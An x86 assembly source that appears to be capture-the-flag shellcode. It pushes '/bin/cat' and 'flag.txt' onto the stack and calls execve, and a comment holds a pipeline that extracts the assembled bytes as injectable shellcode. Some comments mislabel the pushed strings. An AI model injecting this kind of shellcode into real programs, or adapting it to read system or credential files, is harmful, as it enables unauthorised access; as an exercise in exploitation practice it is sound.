.intel_syntax noprefix

.section .text
.global _start


# objdump -d bin_cat | grep '[0-9a-f]:' | grep -oP '\s\K([0-9a-f]{2} )+' | tr -d ' \n' | sed 's/\(..\)/\\x\1/g'

# char *args[] = {"/bin/cat", "flagtxt", NULL}
#   execve("/bin/cat", args, NULL)
_start:
    xor eax, eax
    
    # Push "/bin/cat" onto the stack (including the null terminator)
    push eax        # NULL terminator for "/bin/cat"
    push 0x7461632f # "cat/"
    push 0x6e69622f # "bin/"
    mov ebx, esp
    
    # Push "flagtxt" onto the stack (including the null terminator)
    push eax        # NULL terminator for "flagtxt"
    push 0x7478742e # "txt"
    push 0x67616c66 # "flag"
    mov ecx, esp
    
    # Now set up argv array (pointers to "/bin/cat" and "flagtxt", followed by NULL)
    push eax    # NULL for argv[2]
    push ecx    # Pointer to "flagtxt" (argv[1])
    push ebx    # Pointer to "/bin/cat" (argv[0])
    
    # ECX now points to the argv array: {"/bin/cat", "flagtxt", NULL}
    mov ecx, esp
    
    xor edx, edx
    
    # EBX should point to the filename ("/bin/cat")
    mov ebx, [ecx]  # EBX = "/bin/cat"
    
    # Perform the execve system call
    mov al, 0xb # execve syscall number (11)
    int 0x80    # Trigger the syscall
    
    # Exit the program (in case execve fails)
    mov al, 0x1
    xor ebx, ebx
    int 0x80
